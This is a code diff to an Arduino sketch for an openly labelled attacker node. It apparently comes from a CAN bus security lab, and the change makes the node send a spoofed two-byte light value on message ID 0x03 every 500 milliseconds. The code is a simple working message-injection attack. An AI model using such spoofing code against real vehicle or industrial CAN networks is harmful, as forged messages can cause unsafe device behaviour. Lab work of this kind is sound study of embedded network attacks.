@@ -23,13 +23,14 @@ void setup()
   } while(count--);
 }
 
-void loop()
-{
-  unsigned char fakeData[1] = { 100 };
+void loop() {
+  unsigned int fakeLight = 100;
+  unsigned char fakeData[2];
+  fakeData[0] = fakeLight >> 8;    
+  fakeData[1] = fakeLight & 0xFF;  
 
-  // ID 0x03으로 조작된 데이터 전송
-  CAN.sendMsgBuf(0x03, 0, 1, fakeData);
+  CAN.sendMsgBuf(0x03, 0, 2, fakeData);  
   Serial.println("Attacker sent spoofed data: 100");
 
-  delay(500); // Node2보다 짧은 간격으로 전송
+  delay(500);
 }
